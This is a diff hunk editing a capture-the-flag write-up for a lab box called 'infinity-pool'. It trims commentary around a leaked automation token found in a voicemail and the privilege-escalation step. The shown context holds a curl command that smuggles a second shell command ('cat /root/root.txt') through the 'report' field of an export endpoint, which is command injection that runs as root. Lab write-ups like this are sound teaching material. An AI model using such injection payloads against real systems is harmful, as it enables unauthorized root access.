@@ -174,11 +174,11 @@ Once in, there was a single voicemail sitting in the inbox with the token just s
 
 ![UCP voicemail token leak](../Screenshots/infinity-pool/11-ucp-voicemail-token-leak.png)
 
-`"Automation Key cc_auto_7b3f9a1c4e0d2f6a <9000>"` — right there. Nice hiding spot for a telephony-themed box, gave the ops team a reason to have a UCP inbox worth checking at all.
+`"Automation Key cc_auto_7b3f9a1c4e0d2f6a <9000>"`
 
 ## Root
 
-With the bearer token, `/jobs/export` opened up. The `report` field goes into a `tar` command server-side, same shape of bug as the ping injection that got us in the door in the first place — command injection via an unsanitized parameter, just running as root this time.
+With the bearer token, `/jobs/export` opened up. The `report` field goes into a `tar` command server-side, same shape of bug as the ping injection that got us in the door in the first place command injection via an unsanitized parameter, just running as root this time.
 
 ```
 curl -sS -X POST http://127.0.0.1:9000/jobs/export -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' -H 'Content-Type: application/json' --data-binary '{"report":"test;cat /root/root.txt;#"}'
